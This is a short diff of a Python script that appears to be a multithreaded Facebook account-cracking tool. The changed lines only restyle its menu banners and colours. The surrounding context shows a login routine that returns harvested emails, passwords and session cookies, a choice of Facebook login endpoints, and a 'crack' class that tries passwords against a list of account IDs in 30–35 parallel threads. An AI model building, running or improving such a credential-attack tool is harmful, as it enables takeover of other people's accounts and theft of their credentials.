@@ -529,11 +529,11 @@ def free(em,pas,hosts):
 		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	else:return {"status":"error","email":em,"pass":pas}
 def metode():
-    print ('\033[1;91m╔═════════•ೋೋ•═════════╗')
-    print ('\n \033[0;91m  [1] \033[0;92mLogin mbasic.facebook')
-    print (' \033[0;91m    [2] \033[0;92mLogin m.facebook')
-    print (' \033[0;91m    [3] \033[0;92mLogin free.facebook')
-    print ('\033[1;91m╚═════════•ೋೋ•═════════╝')
+    print ('\033[1;91m╔══════════•ೋೋ•══════════╗')
+    print ('\n\033[0;91m [1] \033[0;92mLogin mbasic.facebook')
+    print (' \033[0;91m  [2] \033[0;92mLogin m.facebook')
+    print (' \033[0;91m  [3] \033[0;92mLogin free.facebook')
+    print ('\033[1;91m╚══════════•ೋೋ•══════════╝')
     md = raw_input('\033[0;91m[•]Choose : ')
     if md == '':
         os.sys.exit()
@@ -569,7 +569,7 @@ class crack:
 		self.cp=[]
 		self.ko=0
 		while True:
-			f=raw_input("\n\033[0;91m[•]Password Auto/Manual (a/m) : ")
+			f=raw_input("\n\033[0;92m[•]Password Auto/Manual (a/m) : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -613,7 +613,7 @@ class crack:
 					print(' \033[0;91m[•]Invalid File')
 					menu()
 					continue
-				print(' \033[0;91╔═══════════════════•ೋೋ•═══════════════════╗')
+				print('\033[0;91═══════════════════•ೋೋ•═══════════════════')
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				print ('\n\033[0;92m [•]Finished*')
@@ -625,7 +625,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print('\n \033[0;91m╔═══════════════════•ೋೋ•═══════════════════╗')
+			print('\n\033[0;91m═══════════════════•ೋೋ•═══════════════════')
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			print ('\n\033[0;92m[•]Finished*')
